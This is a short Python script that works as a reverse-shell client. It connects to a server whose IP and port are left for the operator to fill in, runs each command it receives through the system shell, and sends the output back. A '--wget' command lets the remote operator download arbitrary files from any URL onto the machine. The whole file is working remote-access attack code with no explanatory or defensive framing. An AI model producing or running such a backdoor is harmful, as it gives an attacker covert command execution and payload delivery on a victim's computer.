import socket
import subprocess
import sys
import os

def connect(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        return s
    except Exception as e:
        print("Error:", e)
        return None

def download_file(url):
    try:
        # Use wget (or curl) to download the file
        if sys.platform.startswith('win'):  # For Windows
            download_cmd = f'wget {url} -OutFile downloaded_file'
        else:  # For Unix-like systems (Linux, macOS)
            download_cmd = f'wget {url} -O downloaded_file'

        subprocess.run(download_cmd, shell=True, check=True)
        return "File downloaded successfully."
    except Exception as e:
        return f"Error downloading file: {e}"

def main():
    server_ip = '127.0.0.1'  # Replace with the server's IP address
    server_port = 9001       # Replace with the same port number used on the server

    connection = connect(server_ip, server_port)
    if connection:
        while True:
            try:
                command = connection.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                elif command.startswith('--wget '):
                    url = command[len('--wget '):].strip()
                    result = download_file(url)
                    connection.send(result.encode())
                else:
                    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_data, stderr_data = output.communicate()
                    connection.send(stdout_data + stderr_data)
            except Exception:
                break
        connection.close()

if __name__ == "__main__":
    main()
